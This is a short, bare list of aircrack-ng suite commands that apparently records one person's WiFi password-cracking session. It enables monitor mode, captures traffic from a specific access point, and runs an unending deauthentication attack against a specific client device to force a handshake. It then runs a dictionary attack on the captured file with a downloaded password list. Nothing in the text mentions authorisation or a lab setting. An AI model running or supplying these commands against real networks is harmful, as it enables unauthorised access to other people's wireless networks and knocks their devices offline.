sudo airmon-ng start wlan0 

sudo airodump-ng wlan0mon 

 sudo airodump-ng --bssid 14:75:90:67:E6:92 -c 6 -w /home/hr/ wlan0mon 
 
 sudo aircrack-ng -w /home/hr/下载/wifi_dictionary-master/password.txt /home-02.cap  
 
 sudo aireplay-ng -0 0 -c 50:8E:49:69:7C:0A -a 14:75:90:67:E6:92 wlan0mon
